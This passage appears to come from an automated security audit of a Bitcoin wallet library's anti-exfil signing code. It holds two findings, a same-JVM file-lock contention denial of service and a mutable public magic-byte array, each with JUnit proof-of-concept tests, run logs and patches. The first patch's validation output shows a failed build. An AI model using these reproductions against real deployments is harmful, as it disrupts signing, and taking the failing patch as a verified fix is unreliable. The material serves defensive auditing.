            assertTrue(thrown instanceof OverlappingFileLockException,
                    "losing same-JVM public read should fail before its operation can run, but got " + thrown);

            releaseFirstPublicLoad.countDown();
            assertNotNull(longRunningPublicLoad.get(5, TimeUnit.SECONDS));
        } finally {
            releaseFirstPublicLoad.countDown();
            executor.shutdownNow();
            assertTrue(executor.awaitTermination(5, TimeUnit.SECONDS));
        }

        assertArrayEquals(commitBeforeContention, coordinator.getHostCommitMessage(),
                "state remains valid after the transient same-JVM denial of service");
    }

    @Test
    void sustainedSameJvmContentionRepeatedlyAbortsPublicCoordinatorReads() throws Exception {
        byte[] original = Utils.hexToBytes(field(loadVector("protocol-v1-semantic-psbt-vector.json"), "psbt_hex"));
        Keystore keystore = keystore();
        Path session = temporary.resolve("sustained-session.aexs");
        Path journal = temporary.resolve("sustained-wallet.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4);
        byte[] commitBeforeContention = coordinator.getHostCommitMessage();

        CountDownLatch publicLoadHoldingSessionLock = new CountDownLatch(1);
        CountDownLatch stopContention = new CountDownLatch(1);
        Keystore blockingKeystore = blockingKeystore(keystore, publicLoadHoldingSessionLock, stopContention);
        ExecutorService executor = Executors.newSingleThreadExecutor();
        try {
            Future<AntiExfilCoordinator> holder = executor.submit(() ->
                    AntiExfilCoordinator.load(session, journal, blockingKeystore));
            assertTrue(publicLoadHoldingSessionLock.await(5, TimeUnit.SECONDS),
                    "public load did not reach validation while holding the session lock");

            AtomicInteger overlappingFailures = new AtomicInteger();
            for(int i = 0; i < 10; i++) {
                try {
                    coordinator.getFrozenPsbt();
                } catch(OverlappingFileLockException e) {
                    overlappingFailures.incrementAndGet();
                }
            }
            assertEquals(10, overlappingFailures.get(),
                    "every public read attempted while another same-JVM operation holds the sidecar lock aborts immediately");

            stopContention.countDown();
            assertNotNull(holder.get(5, TimeUnit.SECONDS));
        } finally {
            stopContention.countDown();
            executor.shutdownNow();
            assertTrue(executor.awaitTermination(5, TimeUnit.SECONDS));
        }

        assertArrayEquals(commitBeforeContention, coordinator.getHostCommitMessage());
    }

    private static Keystore blockingKeystore(Keystore delegate, CountDownLatch reachedValidation,
                                             CountDownLatch releaseValidation) {
        return new Keystore() {
            private boolean blocked;

            @Override
            public KeyDerivation getKeyDerivation() {
                return delegate.getKeyDerivation();
            }

            @Override
            public ExtendedKey getExtendedPublicKey() {
                return delegate.getExtendedPublicKey();
            }

            @Override
            public ECKey getPubKeyForDerivation(KeyDerivation keyDerivation) {
                if(!blocked) {
                    blocked = true;
                    reachedValidation.countDown();
                    try {
                        assertTrue(releaseValidation.await(5, TimeUnit.SECONDS),
                                "test timed out waiting to release the public load");
                    } catch(InterruptedException e) {
                        Thread.currentThread().interrupt();
                        throw new AssertionError(e);
                    }
                }
                return delegate.getPubKeyForDerivation(keyDerivation);
            }
        };
    }

    private static String loadVector(String resource) throws Exception {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 22 lines & 0.994140625 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 5s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC executed successfully with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'`; Gradle reported 5 executed tasks and exit code 0. The test demonstrates session-lock contention through public coordinator entry points (`AntiExfilCoordinator.load`, `getHostCommitMessage`, and `getFrozenPsbt`) and asserts immediate unchecked `OverlappingFileLockException` plus continued valid state after contention. It does not separately exercise the shared journal path, because the same vulnerable helper and exception mode are already reached on the session path.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Adds a JVM-local, path-keyed mutex around sidecar FileChannel locking so same-JVM contenders wait before acquiring the OS lock; reference counting removes unused mutexes while preserving cross-process file-lock serialization.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java
@@ -1,88 +1,125 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.channels.FileChannel;
 import java.nio.channels.FileLock;
 import java.nio.file.AtomicMoveNotSupportedException;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
 import java.nio.file.StandardOpenOption;
 import java.util.Arrays;
 import java.util.EnumSet;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.concurrent.locks.ReentrantLock;
 
 import static java.nio.file.attribute.PosixFilePermission.OWNER_READ;
 import static java.nio.file.attribute.PosixFilePermission.OWNER_WRITE;
 
 final class AntiExfilDurableFiles {
+    private static final Map<Path, LocalLock> LOCAL_LOCKS = new HashMap<>();
+
     private AntiExfilDurableFiles() {
     }
 
     static <T> T locked(Path target, IOAction<T> action) {
+        LocalLock localLock = null;
         try {
-            Path absolute = target.toAbsolutePath();
+            Path absolute = target.toAbsolutePath().normalize();
             Path parent = absolute.getParent();
             if(parent == null) throw new IOException("Durable state requires a parent directory");
             Files.createDirectories(parent);
             Path lockPath = parent.resolve(absolute.getFileName() + ".lock");
+            localLock = acquireLocalLock(lockPath);
             try(FileChannel channel = FileChannel.open(lockPath, StandardOpenOption.CREATE, StandardOpenOption.WRITE);
                 FileLock ignored = channel.lock()) {
                 return action.run();
             }
         } catch(IOException e) {
             throw new AntiExfilException(AntiExfilException.Code.STATE_INVALID,
                     "Cannot access durable anti-exfil state: " + e.getMessage(), e);
+        } finally {
+            if(localLock != null) releaseLocalLock(localLock);
         }
     }
 
+    private static LocalLock acquireLocalLock(Path path) {
+        LocalLock localLock;
+        synchronized(LOCAL_LOCKS) {
+            localLock = LOCAL_LOCKS.computeIfAbsent(path, LocalLock::new);
+            localLock.users++;
+        }
+        localLock.lock.lock();
+        return localLock;
+    }
+
+    private static void releaseLocalLock(LocalLock localLock) {
+        localLock.lock.unlock();
+        synchronized(LOCAL_LOCKS) {
+            localLock.users--;
+            if(localLock.users == 0) LOCAL_LOCKS.remove(localLock.path);
+        }
+    }
+
     static byte[] read(Path path, int maximumBytes) throws IOException {
         byte[] encoded = Files.readAllBytes(path);
         if(encoded.length < 32 || encoded.length > maximumBytes) throw new IOException("State length is outside limits");
         byte[] body = Arrays.copyOf(encoded, encoded.length - 32);
         byte[] checksum = Arrays.copyOfRange(encoded, encoded.length - 32, encoded.length);
         if(!Arrays.equals(Sha256Hash.hash(body), checksum)) throw new IOException("State checksum mismatch");
         return body;
     }
 
     static void write(Path path, byte[] body, boolean createOnly) throws IOException {
         if(createOnly && Files.exists(path)) throw new IOException("State already exists");
         byte[] encoded = ByteBuffer.allocate(body.length + 32).put(body).put(Sha256Hash.hash(body)).array();
         Path absolute = path.toAbsolutePath();
         Path parent = absolute.getParent();
         Path temporary = Files.createTempFile(parent, absolute.getFileName() + ".", ".tmp");
         boolean moved = false;
         try {
             try {
                 Files.setPosixFilePermissions(temporary, EnumSet.of(OWNER_READ, OWNER_WRITE));
             } catch(UnsupportedOperationException ignored) {
                 // Windows uses inherited ACLs; POSIX stores are restricted explicitly.
             }
             try(FileChannel channel = FileChannel.open(temporary, StandardOpenOption.WRITE,
                     StandardOpenOption.TRUNCATE_EXISTING)) {
                 ByteBuffer buffer = ByteBuffer.wrap(encoded);
                 while(buffer.hasRemaining()) channel.write(buffer);
                 channel.force(true);
             }
             try {
                 if(createOnly) {
                     Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE);
                 } else {
                     Files.move(temporary, absolute, StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
                 }
             } catch(AtomicMoveNotSupportedException e) {
                 throw new IOException("Filesystem does not support atomic durable-state replacement", e);
             }
             moved = true;
         } finally {
             if(!moved) Files.deleteIfExists(temporary);
         }
     }
 
+    private static final class LocalLock {
+        private final Path path;
+        private final ReentrantLock lock = new ReentrantLock();
+        private int users;
+
+        private LocalLock(Path path) {
+            this.path = path;
+        }
+    }
+
     @FunctionalInterface
     interface IOAction<T> {
         T run() throws IOException;
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilDurableFiles.java`
### Validation output

```
[output truncated: 33 lines & 0.97265625 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 16s
```

---

# Mutable magic corrupts the global codec
**#247999**
- Severity: Low
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java` (3 locations)
#### Line 16 — _The mutable backing array is public._

```
    public static final byte[] MAGIC = {'A', 'E', 'X', 'B'};
```
⋯
#### Lines 28-34 — _Encoding consumes the live array._

```
    public static byte[] encode(AntiExfilMessage message) {
        validate(message);
        int payloadLength = Math.multiplyExact(message.getSlots().size(), message.getStage().getRecordLength());
        ByteBuffer buffer = ByteBuffer.allocate(HEADER_LENGTH + payloadLength);
        buffer.put(MAGIC).put((byte)FORMAT_VERSION).put((byte)message.getNetwork().getCode())
                .put((byte)message.getStage().getCode()).put((byte)0).putInt(payloadLength)
                .put(message.getSessionId()).put(message.getPsbtDigest()).putShort((short)message.getSlots().size());
```
⋯
#### Lines 45-53 — _Decoding trusts the same live array._

```
    public static AntiExfilMessage decode(byte[] encoded) {
        if(encoded == null || encoded.length < HEADER_LENGTH || encoded.length > MAX_MESSAGE_BYTES) {
            throw fail(INVALID_MESSAGE, "AEXB message length is outside v1 limits");
        }
        ByteBuffer buffer = ByteBuffer.wrap(encoded);
        byte[] magic = new byte[4];
        buffer.get(magic);
        if(!Arrays.equals(magic, MAGIC)) throw fail(INVALID_MESSAGE, "Wrong AEXB magic");
        if(Byte.toUnsignedInt(buffer.get()) != FORMAT_VERSION) throw fail(INVALID_MESSAGE, "Unsupported AEXB version");
```
## Description

`AntiExfilCodec.MAGIC` is a public `static final byte[]`, so `final` protects only its reference while any in-JVM caller can change its bytes. Encoding writes the live array directly, and decoding compares incoming framing against that same live array. Mutating one element therefore changes the wire format accepted and emitted by every codec operation in the process. Canonical `AEXB` transcripts are then rejected while attacker-selected magic is accepted until the value is restored or the process restarts. Other message checks remain active, so this corrupts framing rather than forging signatures.
## Root cause

Mutable array storage is exposed as a public protocol constant and reused directly at both codec boundaries.
## Impact

An untrusted or faulty library caller can cause process-wide anti-exfil protocol failures and interoperability loss. It can also make noncanonical magic pass the parser, though it cannot bypass the remaining transcript and cryptographic validation by this mutation alone.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.Sha256Hash;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Dedicated, package-scoped PoC slot for anti-exfil security reproductions.
 */
class Poc {
    private static final String WORDS = "model ensure search plunge galaxy firm exclude brain satoshi meadow cable roast";
    private static final Pattern STRING_FIELD = Pattern.compile("\\\"%s\\\"\\s*:\\s*\\\"([0-9a-f]+)\\\"");

    @TempDir
    Path temporary;

    @Test
    void mutablePublicMagicGloballyChangesAcceptedAndEmittedCodecFraming() throws Exception {
        byte[] canonicalWireMessage = Utils.hexToBytes(field(loadVector("protocol-v1-multislot-vectors.json"), "message_hex"));
        AntiExfilMessage decodedBeforeMutation = AntiExfilCodec.decode(canonicalWireMessage);
        byte[] canonicalEncoding = AntiExfilCodec.encode(decodedBeforeMutation);
        assertArrayEquals(canonicalWireMessage, canonicalEncoding);

        byte[] originalMagic = AntiExfilCodec.MAGIC.clone();
        try {
            AntiExfilCodec.MAGIC[0] = (byte)(AntiExfilCodec.MAGIC[0] ^ 0x20);

            AntiExfilException rejectedCanonical = assertThrows(AntiExfilException.class,
                    () -> AntiExfilCodec.decode(canonicalWireMessage));
            assertEquals(AntiExfilException.Code.INVALID_MESSAGE, rejectedCanonical.getCode());

            byte[] attackerFramedEncoding = AntiExfilCodec.encode(decodedBeforeMutation);
            assertFalse(Arrays.equals(Arrays.copyOf(attackerFramedEncoding, originalMagic.length),
                    Arrays.copyOf(canonicalEncoding, originalMagic.length)));
            AntiExfilMessage acceptedAttackerFramedMessage = AntiExfilCodec.decode(attackerFramedEncoding);
            assertEquals(decodedBeforeMutation.getStage(), acceptedAttackerFramedMessage.getStage());
            assertArrayEquals(decodedBeforeMutation.getSessionId(), acceptedAttackerFramedMessage.getSessionId());
            assertArrayEquals(decodedBeforeMutation.getPsbtDigest(), acceptedAttackerFramedMessage.getPsbtDigest());
            assertEquals(decodedBeforeMutation.getSlots().size(), acceptedAttackerFramedMessage.getSlots().size());
        } finally {
            System.arraycopy(originalMagic, 0, AntiExfilCodec.MAGIC, 0, originalMagic.length);
        }
    }

    @Test
    void drivesFrozenPsbtTranscriptThroughDurableCoordinator() throws Exception {
        String vector = loadVector("protocol-v1-semantic-psbt-vector.json");
        byte[] original = Utils.hexToBytes(field(vector, "psbt_hex"));
        byte[] expectedCommit = Utils.hexToBytes(field(vector, "message_1_hex"));
        byte[] signatures = Utils.hexToBytes(field(vector, "message_4_hex"));
        Keystore keystore = keystore();

        AntiExfilMessage finalMessage = AntiExfilCodec.decode(signatures);
        List<AntiExfilSlot> openingSlots = new ArrayList<>();
        for(AntiExfilSlot slot : finalMessage.getSlots()) {
            openingSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                    slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), null, null));
        }
        byte[] openings = AntiExfilCodec.encode(new AntiExfilMessage(finalMessage.getNetwork(),
                AntiExfilStage.SIGNER_OPENINGS, finalMessage.getSessionId(), finalMessage.getPsbtDigest(), openingSlots));

        Path session = temporary.resolve("poc.aexs");
        Path journal = temporary.resolve("poc.aexj");
        AntiExfilCoordinator coordinator = AntiExfilCoordinator.create(session, journal, original, keystore,
                AntiExfilNetwork.TESTNET4, false, new VectorRandom());
        assertArrayEquals(expectedCommit, coordinator.getHostCommitMessage());

        byte[] reveal = coordinator.acceptOpenings(openings);
        AntiExfilMessage revealMessage = AntiExfilCodec.decode(reveal);
        assertEquals(AntiExfilStage.HOST_REVEAL, revealMessage.getStage());
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(expectedCommit), AntiExfilCodec.decode(openings));
        AntiExfilCodec.validateTransition(AntiExfilCodec.decode(openings), revealMessage);

        AntiExfilCoordinator.Completion completion = coordinator.complete(signatures);
        assertFalse(completion.isBroadcast());
        assertEquals(field(vector, "signed_psbt_sha256"), Utils.bytesToHex(Sha256Hash.hash(completion.getSignedPsbt())));
        assertEquals(5, completion.getVerifiedSignatures().size());
        assertEquals(5, AntiExfilPsbt.enumerateSigningSlots(original, keystore).size());
    }

    private static String loadVector(String resource) throws IOException {
        try(InputStream stream = Poc.class.getResourceAsStream(resource)) {
            assertNotNull(stream, "Missing test vector " + resource);
            return new String(stream.readAllBytes(), StandardCharsets.UTF_8);
        }
    }

    private static String field(String vector, String name) {
        Matcher matcher = Pattern.compile(STRING_FIELD.pattern().formatted(Pattern.quote(name))).matcher(vector);
        assertTrue(matcher.find(), "Missing vector field " + name);
        return matcher.group(1);
    }

    private static Keystore keystore() throws Exception {
        DeterministicSeed seed = new DeterministicSeed(WORDS, "", 0, DeterministicSeed.Type.BIP39);
        return Keystore.fromSeed(seed, PolicyType.SINGLE_HD, KeyDerivation.parsePath("m/84'/1'/0'"));
    }

    private static final class VectorRandom extends SecureRandom {
        private int call;

        @Override
        public void nextBytes(byte[] bytes) {
            Arrays.fill(bytes, call++ == 0 ? (byte)'z' : (byte)(0x7f + call - 1));
        }
    }
}
```
### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   src/test/java/com/sparrowwallet/drongo/antiexfil/Poc.java

# build and run
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew testClasses
JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'
```
### Output

```
[output truncated: 11 lines & 0.7431640625 KB skipped]
> Task :processResources
> Task :classes
> Task :compileTestJava
> Task :processTestResources
> Task :testClasses
> Task :test

BUILD SUCCESSFUL in 11s
5 actionable tasks: 5 executed
Consider enabling configuration cache to speed up this build: https://docs.gradle.org/9.1.0/userguide/configuration_cache_enabling.html
```
### Considerations

PoC is an in-process JUnit reproduction of the public Java API defect. It demonstrates global codec-framing corruption through direct mutation of the public AntiExfilCodec.MAGIC byte array: a canonical fixture decodes before mutation, the same canonical bytes are rejected after mutation, AntiExfilCodec.encode emits the mutated noncanonical magic, and AntiExfilCodec.decode accepts that mutated framing. It does not demonstrate signature forgery or transcript bypass, matching the finding’s stated limitation that remaining message and cryptographic checks stay active. Verified with `JAVA_HOME=/home/v12/.local/jdks/temurin-22 sh ./gradlew test --rerun-tasks --tests 'com.sparrowwallet.drongo.antiexfil.Poc'` exit 0.
### Validation reasoning

PoC validation command completed successfully.
## Remediation
### Explanation

Keep the public MAGIC array for source compatibility but isolate it as a clone; encode and decode now use a private canonical WIRE_MAGIC array that callers cannot mutate, so codec framing remains fixed to AEXB.
### Patch

```diff
diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCodec.java
@@ -1,186 +1,187 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.crypto.ECKey;
 
 import java.math.BigInteger;
 import java.nio.ByteBuffer;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCodec {
-    public static final byte[] MAGIC = {'A', 'E', 'X', 'B'};
+    private static final byte[] WIRE_MAGIC = {'A', 'E', 'X', 'B'};
+    public static final byte[] MAGIC = WIRE_MAGIC.clone();
     public static final int FORMAT_VERSION = 1;
     public static final long SIGHASH_ALL = 1;
     public static final int MAX_SLOTS = 128;
     public static final int MAX_SLOTS_PER_INPUT = 16;
     public static final int MAX_MESSAGE_BYTES = 65_536;
     public static final int HEADER_LENGTH = 78;
     public static final int COMMON_RECORD_LENGTH = 105;
 
     private AntiExfilCodec() {
     }
 
     public static byte[] encode(AntiExfilMessage message) {
         validate(message);
         int payloadLength = Math.multiplyExact(message.getSlots().size(), message.getStage().getRecordLength());
         ByteBuffer buffer = ByteBuffer.allocate(HEADER_LENGTH + payloadLength);
-        buffer.put(MAGIC).put((byte)FORMAT_VERSION).put((byte)message.getNetwork().getCode())
+        buffer.put(WIRE_MAGIC).put((byte)FORMAT_VERSION).put((byte)message.getNetwork().getCode())
                 .put((byte)message.getStage().getCode()).put((byte)0).putInt(payloadLength)
                 .put(message.getSessionId()).put(message.getPsbtDigest()).putShort((short)message.getSlots().size());
         for(AntiExfilSlot slot : message.getSlots()) {
             buffer.putInt((int)slot.getInputIndex()).putInt((int)slot.getSighashType())
                     .put(slot.getSignerPublicKey()).put(slot.getMessageHash()).put(slot.getCommitment());
             if(message.getStage().getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode()) buffer.put(slot.getOpening());
             if(message.getStage() == AntiExfilStage.HOST_REVEAL) buffer.put(slot.getHostRandomness());
             if(message.getStage() == AntiExfilStage.SIGNER_SIGNATURES) buffer.put(slot.getSignature());
         }
         return buffer.array();
     }
 
     public static AntiExfilMessage decode(byte[] encoded) {
         if(encoded == null || encoded.length < HEADER_LENGTH || encoded.length > MAX_MESSAGE_BYTES) {
             throw fail(INVALID_MESSAGE, "AEXB message length is outside v1 limits");
         }
         ByteBuffer buffer = ByteBuffer.wrap(encoded);
         byte[] magic = new byte[4];
         buffer.get(magic);
-        if(!Arrays.equals(magic, MAGIC)) throw fail(INVALID_MESSAGE, "Wrong AEXB magic");
+        if(!Arrays.equals(magic, WIRE_MAGIC)) throw fail(INVALID_MESSAGE, "Wrong AEXB magic");
         if(Byte.toUnsignedInt(buffer.get()) != FORMAT_VERSION) throw fail(INVALID_MESSAGE, "Unsupported AEXB version");
         AntiExfilNetwork network = AntiExfilNetwork.fromCode(Byte.toUnsignedInt(buffer.get()));
         AntiExfilStage stage = AntiExfilStage.fromCode(Byte.toUnsignedInt(buffer.get()));
         if(buffer.get() != 0) throw fail(INVALID_MESSAGE, "Unknown AEXB flags are set");
         long payloadLength = Integer.toUnsignedLong(buffer.getInt());
         byte[] sessionId = new byte[32];
         byte[] psbtDigest = new byte[32];
         buffer.get(sessionId).get(psbtDigest);
         int slotCount = Short.toUnsignedInt(buffer.getShort());
         if(slotCount < 1 || slotCount > MAX_SLOTS) throw fail(INVALID_MESSAGE, "AEXB slot count is outside v1 limits");
         long expectedPayload = (long)slotCount * stage.getRecordLength();
         if(payloadLength != expectedPayload || encoded.length != HEADER_LENGTH + expectedPayload) {
             throw fail(INVALID_MESSAGE, "AEXB payload length is not canonical for its stage");
         }
         List<AntiExfilSlot> slots = new ArrayList<>(slotCount);
         for(int i = 0; i < slotCount; i++) {
             long inputIndex = Integer.toUnsignedLong(buffer.getInt());
             long sighash = Integer.toUnsignedLong(buffer.getInt());
             byte[] publicKey = read(buffer, 33);
             byte[] messageHash = read(buffer, 32);
             byte[] commitment = read(buffer, 32);
             byte[] opening = stage.getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode() ? read(buffer, 33) : null;
             byte[] rho = stage == AntiExfilStage.HOST_REVEAL ? read(buffer, 32) : null;
             byte[] signature = stage == AntiExfilStage.SIGNER_SIGNATURES ? read(buffer, 64) : null;
             slots.add(new AntiExfilSlot(inputIndex, sighash, publicKey, messageHash, commitment, opening, rho, signature));
         }
         AntiExfilMessage message = new AntiExfilMessage(network, stage, sessionId, psbtDigest, slots);
         validate(message);
         return message;
     }
 
     public static void validateTransition(AntiExfilMessage previous, AntiExfilMessage current) {
         if(current.getStage().getCode() != previous.getStage().getCode() + 1) throw fail(WRONG_STAGE, "Stages are not adjacent");
         if(previous.getNetwork() != current.getNetwork()
                 || !Arrays.equals(previous.getSessionId(), current.getSessionId())
                 || !Arrays.equals(previous.getPsbtDigest(), current.getPsbtDigest())) {
             throw fail(TRANSACTION_MISMATCH, "Transcript context changed between stages");
         }
         if(previous.getSlots().size() != current.getSlots().size()) throw fail(SIGNATURE_SLOT_MISMATCH, "Slot count changed");
         for(int i = 0; i < previous.getSlots().size(); i++) {
             AntiExfilSlot before = previous.getSlots().get(i);
             AntiExfilSlot after = current.getSlots().get(i);
             if(before.getInputIndex() != after.getInputIndex()
                     || before.getSighashType() != after.getSighashType()
                     || !Arrays.equals(before.getSignerPublicKey(), after.getSignerPublicKey())
                     || !Arrays.equals(before.getMessageHash(), after.getMessageHash())) {
                 throw fail(SIGNATURE_SLOT_MISMATCH, "Slot identity or signing context changed");
             }
             if(!Arrays.equals(before.getCommitment(), after.getCommitment())) throw fail(COMMITMENT_MISMATCH, "Commitment changed");
             if(previous.getStage().getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode()
                     && !Arrays.equals(before.getOpening(), after.getOpening())) throw fail(OPENING_MISMATCH, "Accepted opening changed");
             if(current.getStage() == AntiExfilStage.HOST_REVEAL
                     && !Arrays.equals(AntiExfilCrypto.hostCommit(after.getHostRandomness()), after.getCommitment())) {
                 throw fail(COMMITMENT_MISMATCH, "Host reveal does not match commitment");
             }
         }
     }
 
     public static void validate(AntiExfilMessage message) {
         if(message == null || message.getNetwork() == null || message.getStage() == null
                 || length(message.getSessionId()) != 32 || length(message.getPsbtDigest()) != 32
                 || message.getSlots() == null || message.getSlots().isEmpty() || message.getSlots().size() > MAX_SLOTS) {
             throw fail(INVALID_MESSAGE, "Invalid AEXB message header");
         }
         Set<Bytes> commitments = new HashSet<>();
         Set<Bytes> reveals = new HashSet<>();
         long previousInput = -1;
         byte[] previousKey = null;
         int perInput = 0;
         for(AntiExfilSlot slot : message.getSlots()) {
             validateSlot(message.getStage(), slot);
             int order = previousKey == null ? 1 : compareIdentifier(previousInput, previousKey, slot.getInputIndex(), slot.getSignerPublicKey());
             if(order >= 0 && previousKey != null) throw fail(SIGNATURE_SLOT_MISMATCH, "Slots are not uniquely ordered");
             perInput = slot.getInputIndex() == previousInput ? perInput + 1 : 1;
             if(perInput > MAX_SLOTS_PER_INPUT) throw fail(SIGNATURE_SLOT_MISMATCH, "Input exceeds the slot limit");
             if(!commitments.add(new Bytes(slot.getCommitment()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host commitment");
             if(slot.getHostRandomness() != null && !reveals.add(new Bytes(slot.getHostRandomness()))) throw fail(COMMITMENT_MISMATCH, "Duplicate host reveal");
             previousInput = slot.getInputIndex();
             previousKey = slot.getSignerPublicKey();
         }
     }
 
     private static void validateSlot(AntiExfilStage stage, AntiExfilSlot slot) {
         if(slot == null || slot.getInputIndex() < 0 || slot.getInputIndex() > 0xffff_ffffL || slot.getSighashType() != SIGHASH_ALL) {
             throw fail(INVALID_MESSAGE, "Invalid slot index or sighash");
         }
         requirePoint(slot.getSignerPublicKey(), "signer public key");
         requireLength(slot.getMessageHash(), 32, "message hash");
         requireLength(slot.getCommitment(), 32, "host commitment");
         boolean needsOpening = stage.getCode() >= AntiExfilStage.SIGNER_OPENINGS.getCode();
         if((slot.getOpening() != null) != needsOpening) throw fail(INVALID_MESSAGE, "Opening presence conflicts with stage");
         if((slot.getHostRandomness() != null) != (stage == AntiExfilStage.HOST_REVEAL)) throw fail(INVALID_MESSAGE, "Reveal presence conflicts with stage");
         if((slot.getSignature() != null) != (stage == AntiExfilStage.SIGNER_SIGNATURES)) throw fail(INVALID_MESSAGE, "Signature presence conflicts with stage");
         if(slot.getOpening() != null) requirePoint(slot.getOpening(), "signer opening");
         if(slot.getHostRandomness() != null) requireLength(slot.getHostRandomness(), 32, "host reveal");
         if(slot.getSignature() != null) {
             requireLength(slot.getSignature(), 64, "compact signature");
             BigInteger r = new BigInteger(1, Arrays.copyOfRange(slot.getSignature(), 0, 32));
             BigInteger s = new BigInteger(1, Arrays.copyOfRange(slot.getSignature(), 32, 64));
             if(r.signum() <= 0 || r.compareTo(ECKey.CURVE.getN()) >= 0 || s.signum() <= 0 || s.compareTo(ECKey.HALF_CURVE_ORDER) > 0) {
                 throw fail(INVALID_MESSAGE, "Signature scalars are invalid or non-low-S");
             }
         }
     }
 
     private static int compareIdentifier(long leftIndex, byte[] leftKey, long rightIndex, byte[] rightKey) {
         int indexComparison = Long.compare(leftIndex, rightIndex);
         if(indexComparison != 0) return indexComparison;
         return Arrays.compareUnsigned(leftKey, rightKey);
     }
 
     private static void requirePoint(byte[] point, String name) {
         requireLength(point, 33, name);
         if(point[0] != 2 && point[0] != 3) throw fail(INVALID_MESSAGE, name + " is not compressed");
         try {
             if(ECKey.CURVE.getCurve().decodePoint(point).isInfinity()) throw fail(INVALID_MESSAGE, name + " is infinity");
         } catch(IllegalArgumentException e) {
